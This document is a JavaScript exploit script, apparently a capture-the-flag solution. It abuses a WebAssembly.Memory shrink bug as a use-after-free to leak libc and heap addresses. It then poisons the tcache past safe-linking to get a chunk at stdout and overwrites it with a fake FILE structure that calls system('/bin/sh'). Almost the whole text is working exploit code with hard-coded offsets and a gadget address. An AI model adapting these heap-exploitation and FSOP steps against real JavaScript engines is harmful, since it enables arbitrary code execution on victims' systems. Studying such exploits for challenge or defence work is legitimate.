// house keeping: prep a 0x70 sized memory_obj so that when we shrink it, it will place a 
// 0x70 sized chunk in the tcache
// we do this so that later, when we do tcache poisoning, we can have 2 chunks in 0x70 tcache bin
let dummy_memory_obj = new WebAssembly.Memory({
    initial: 1,
    maximum: 2
});
dummy_memory_obj.shrink(0x10000 - 0x1f0);

let memory_obj = new WebAssembly.Memory({
    initial: 1,
    maximum: 2
});
let padding = new ArrayBuffer(0x70);

// memory gets allocated in some mmmaped space so shrink it once to place it on the heap
memory_obj.shrink(1);
let dv = new DataView(memory_obj.buffer);

// shrink it again such that it will get placed into another chunk
// IMPORTANT: dv dataview will have it's buffer pointing to the old chunk, where there will be a main arena pointer
memory_obj.shrink(1);
let libc_leak = dv.getBigUint64(0, true);
console.log("libc_leak: 0x" + libc_leak.toString(16));
let libc_base = libc_leak - 0x21ace0n - 0x780n;
console.log("libc_base: 0x" + libc_base.toString(16));

// shrink it again to reasonalbe tcache size and set up for tcache poisoning
// dv2 will be able to edit data in a freed chunk
// TL;DR: with dv2 we are able to edit a freed 0x70 sized chunk, placed in the tcache
// also shrink the dummy_memory_obj so that we have 2 0x70 chunks in the tcache
memory_obj.shrink(0x10000 - 0x1f0);
let dv2 = new DataView(memory_obj.buffer);
dummy_memory_obj.shrink(0x20);
memory_obj.shrink(0x20); // shrink this to something, we don't care about it anymore
// 0x70 TCACHE setup: chunk we control -> chunk from dummy_memory_obj

// leak heap so we can bypass tcache xor stuff
// we can use old dv
let heap_leak = dv.getBigUint64(8 * 2, true);
console.log("heap_leak: 0x" + heap_leak.toString(16));
let heap_base = heap_leak - 0x2ba40n;
console.log("heap_base: 0x" + heap_base.toString(16));


// caclulate safe linking stuff
let stdout = libc_base + 0x21b780n;
console.log("stdout: 0x" + stdout.toString(16));
let crt_chunk = heap_base + 0x28a00n;
console.log("crt_chunk: 0x" + crt_chunk.toString(16));
let mangled_next = (crt_chunk >> 12n) ^ stdout;

// edit the freed chunk to point to stdout
dv2.setBigUint64(0, mangled_next, true);

// alocate 2 memory objects then turn them into 0x70 chunks to get chunk in stdout
let memory_obj3 = new WebAssembly.Memory({
    initial: 1,
    maximum: 2
});
let memory_obj4 = new WebAssembly.Memory({
    initial: 1,
    maximum: 2
});
memory_obj3.shrink(0x10000 - 0x1f0);
memory_obj4.shrink(0x10000 - 0x1f0);
let stdout_dv = new DataView(memory_obj4.buffer);

// FSOP RCE

// # some constants
// stdout_lock = libc.address + 0x2008f0   # _IO_stdfile_1_lock  (symbol not exported)
// stdout = libc.sym['_IO_2_1_stdout_']
// fake_vtable = libc.sym['_IO_wfile_jumps']-0x18
// # our gadget
// gadget = libc.address + 0x00000000001676a0 # add rdi, 0x10 ; jmp rcx

// fake = FileStructure(0)
// fake.flags = 0x3b01010101010101
// fake._IO_read_end=libc.sym['system']            # the function that we will call: system()
// fake._IO_save_base = gadget
// fake._IO_write_end=u64(b'/bin/sh\x00')  # will be at rdi+0x10
// fake._lock=stdout_lock
// fake._codecvt= stdout + 0xb8
// fake._wide_data = stdout+0x200          # _wide_data just need to points to empty zone
// fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)

// flags: 0x0
// _IO_read_ptr: 0x8
// _IO_read_end: 0x10
// _IO_read_base: 0x18
// _IO_write_base: 0x20
// _IO_write_ptr: 0x28
// _IO_write_end: 0x30
// _IO_buf_base: 0x38
// _IO_buf_end: 0x40
// _IO_save_base: 0x48
// _IO_backup_base: 0x50
// _IO_save_end: 0x58
// markers: 0xd8
// chain: 0x68
// fileno: 0x70
// _flags2: 0x74
// _old_offset: 0x78
// _cur_column: 0x80
// _vtable_offset: 0x82
// _shortbuf: 0x83
// unknown1: 0x84
// _lock: 0x88
// _offset: 0x90
// _codecvt: 0x98
// _wide_data: 0xa0
// unknown2: 0xa8
// vtable: 0xd8

let stdout_lock = libc_base + 0x21ca70n;
let fake_vtable = libc_base + 0x2170c0n - 0x18n;
let system = libc_base + 0x50d70n;
let gadget = libc_base + 0x1636a0n;

let fake = new ArrayBuffer(0xe8);
let fake_dv = new DataView(fake);
fake_dv.setBigUint64(0x0, 0x3b01010101010101n, true); // flags
fake_dv.setBigUint64(0x10, system, true); // _IO_read_end
fake_dv.setBigUint64(0x48, gadget, true); // _IO_save_base
fake_dv.setBigUint64(0x30, 0x68732f6e69622fn, true); // _IO_write_end
fake_dv.setBigUint64(0x78, 0xffffffffffffffffn, true); // _old_offset
fake_dv.setBigUint64(0x88, stdout_lock, true); // _lock
fake_dv.setBigUint64(0x90, 0xffffffffffffffffn, true); // _offset
fake_dv.setBigUint64(0x98, stdout + 0xb8n, true); // _codecvt
fake_dv.setBigUint64(0xa0, stdout + 0x200n, true); // _wide_data
fake_dv.setBigUint64(0xa8, 0n, true); // unknown2 + 0
fake_dv.setBigUint64(0xa8 + 8, 0n, true); // unknown2 + 8
fake_dv.setBigUint64(0xa8 + 16, stdout + 0x20n, true); // unknown2 + 16
fake_dv.setBigUint64(0xa8 + 24, 0n, true); // unknown2 + 24
fake_dv.setBigUint64(0xa8 + 32, 0n, true); // unknown2 + 32
fake_dv.setBigUint64(0xa8 + 40, 0n, true); // unknown2 + 40
fake_dv.setBigUint64(0xa8 + 48, fake_vtable, true); // unknown2 + 48

// set stdout_dv in one go
let stdout_dv_data = new Uint8Array(stdout_dv.buffer);
let fake_data = new Uint8Array(fake);
stdout_dv_data.set(fake_data, 0);


